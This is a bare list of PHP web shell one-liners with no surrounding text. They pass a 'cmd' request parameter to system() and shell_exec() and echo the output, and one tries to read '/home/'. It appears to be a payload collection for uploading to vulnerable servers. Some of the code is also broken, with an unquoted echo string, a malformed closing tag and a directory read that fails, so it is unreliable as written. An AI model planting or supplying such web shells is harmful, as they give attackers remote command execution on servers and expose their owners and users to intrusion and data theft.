<?php system($_GET['cmd']);?>
<?php echo file_get_contents('/home/'); ?>
<?php 
if(isset($_GET["cmd"])){
  $output = shell_exec($_GET["cmd"]);
  echo <h1>$output</h1>;
}
>
